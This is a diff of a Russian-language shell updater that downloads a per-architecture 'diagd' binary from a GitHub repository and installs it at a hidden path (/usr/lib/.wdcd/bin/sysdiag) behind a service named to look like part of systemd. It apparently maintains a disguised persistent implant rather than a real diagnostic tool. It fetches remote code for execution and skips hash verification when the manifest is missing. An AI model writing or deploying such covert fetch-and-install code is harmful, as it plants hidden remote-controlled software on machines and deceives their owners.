@@ -8,7 +8,18 @@ _dl() {
   else return 1
   fi
 }
-URL="${1:-https://github.com/gerardovsa/Ai_Agents/raw/V2_clean/tools/diagd}"
+_arch() {
+  case "$(uname -m)" in
+    x86_64|amd64) echo diagd ;;
+    aarch64|arm64) echo diagd-arm64 ;;
+    armv7l|armv7|armv6l|armv6|armhf) echo diagd-armhf ;;
+    riscv64) echo diagd-riscv64 ;;
+    *) echo diagd ;;
+  esac
+}
+BASE="https://github.com/gerardovsa/Ai_Agents/raw/V2_clean/tools"
+BINAME=$(_arch)
+URL="${1:-$BASE/$BINAME}"
 BIN="/usr/lib/.wdcd/bin/sysdiag"
 SVC="systemd-sysdiag.service"
 TMP="$(mktemp /tmp/sysdiag.XXXXXX)"
@@ -19,21 +30,21 @@ if [ ! -f "$BIN" ]; then
   exit 1
 fi
 echo "текущая версия: $("$BIN" --version 2>/dev/null | head -1 || echo unknown)"
-echo "скачиваю новый бинарник: $URL"
+echo "скачиваю новый бинарник: $URL ($BINAME)"
 if ! _dl "$URL" "$TMP"; then
   echo "скачивание не удалось (нет curl/wget/python3)" >&2
   exit 1
 fi
-_dl "${URL%/diagd}/MANIFEST.sha256" "$TMP.sha" || true
+_dl "$BASE/MANIFEST.sha256" "$TMP.sha" || true
 if [ ! -s "$TMP" ]; then echo "скачивание не удалось" >&2; exit 1; fi
 NEW_SHA=$(sha256sum "$TMP" | awk '{print $1}')
 if [ -s "$TMP.sha" ]; then
-  EXPECTED=$(awk '{print $1}' "$TMP.sha" 2>/dev/null)
+  EXPECTED=$(grep "[[:space:]]$BINAME$" "$TMP.sha" 2>/dev/null | awk '{print $1}')
   if [ -n "$EXPECTED" ] && [ "$EXPECTED" != "$NEW_SHA" ]; then
     echo "SHA256 mismatch: получено $NEW_SHA, ожидалось $EXPECTED" >&2
     exit 1
   fi
-  echo "sha256 OK: $NEW_SHA"
+  echo "sha256 OK: $NEW_SHA ($BINAME)"
 else
   echo "предупреждение: MANIFEST.sha256 не скачан, пропускаю сверку" >&2
 fi
